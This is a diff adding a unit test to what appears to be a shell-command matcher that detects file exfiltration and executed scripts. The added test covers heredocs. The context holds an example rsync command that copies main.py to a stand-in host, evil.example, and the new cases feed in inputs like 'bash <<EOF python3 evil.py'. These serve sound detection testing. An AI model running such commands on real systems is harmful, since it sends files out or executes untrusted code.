@@ -259,6 +259,13 @@ class MatcherFalsePositiveTests(unittest.TestCase):
             self.L._extract_exfil_paths('rsync -a -e "ssh -i k.pem" main.py u@evil.example:dev'),
             ["main.py"])
 
+    def test_heredoc_body_is_not_a_command_unless_a_shell_reads_it(self):
+        ex = lambda c: self.L._extract_executed_paths(self.L._strip_heredocs(c))
+        self.assertEqual(ex("cd d && python3 - <<'EOF'\nRun: python3 compose3.py\nEOF"), [])
+        self.assertEqual(ex("cat > x.sh <<'EOF'\nbash y.sh\nEOF\nbash x.sh"), ["x.sh"])
+        self.assertEqual(ex("bash <<EOF\npython3 evil.py\nEOF"), ["evil.py"])
+        self.assertEqual(ex("ssh h <<'EOF'\nbash run.sh\nEOF"), ["run.sh"])
+
     def test_copy_to_ssh_config_host_is_not_exfil(self):
         with tempfile.TemporaryDirectory() as home:
             (Path(home) / ".ssh").mkdir()
